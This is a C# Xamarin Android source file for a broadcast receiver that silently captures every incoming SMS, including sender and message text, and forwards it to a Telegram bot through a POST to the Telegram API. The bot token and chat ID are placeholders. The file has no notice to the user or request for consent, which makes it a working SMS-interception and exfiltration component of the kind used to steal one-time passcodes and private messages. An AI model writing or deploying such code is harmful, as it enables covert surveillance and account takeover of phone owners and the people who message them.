using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Telephony;
using Android.Widget;
using Java.IO;
using Java.Net;
using Newtonsoft.Json;
using OkHttp3;
using Xamarin.Android;

[BroadcastReceiver(Enabled = true, Exported = true)]
[IntentFilter(new[] { "android.provider.Telephony.SMS_RECEIVED" })]
public class SmsReceiver : BroadcastReceiver
{
    private static readonly string TelegramWebhookUrl = "https://api.telegram.org/bot<YOUR_TOKEN>/sendMessage";
    private static readonly MediaType Json = MediaType.Parse("application/json; charset=utf-8");

    public override void OnReceive(Context context, Intent intent)
    {
        if (intent.Extras != null)
        {
            var sms = new StringBuilder();
            var bundle = intent.Extras;
            var pdus = (Java.Lang.Object[])bundle.Get("pdus");
            var messages = new SmsMessage[pdus.Length];
            for (var i = 0; i < messages.Length; i++)
            {
                messages[i] = SmsMessage.CreateFromPdu((byte[])pdus[i]);
                sms.Append("SMS from " + messages[i].OriginatingAddress);
                sms.Append(": ");
                sms.Append(messages[i].MessageBody);
                sms.Append("\n");
            }
            var smsMessage = sms.ToString();
            //Toast.MakeText(context, smsMessage, ToastLength.Short).Show();
            SendTelegramMessage(smsMessage);
        }
    }

    private void SendTelegramMessage(string message)
    {
        var client = new OkHttpClient();
        var json = "{\"chat_id\":\"<YOUR_CHAT_ID>\",\"text\":\"" + message + "\"}";
        var body = RequestBody.Create(json, Json);
        var request = new Request.Builder()
            .Url(TelegramWebhookUrl)
            .Post(body)
            .Build();
        try
        {
            var response = client.NewCall(request).Execute();
            // Handle response here
        }
        catch (IOException e)
        {
            Console.WriteLine(e);
        }
    }
}
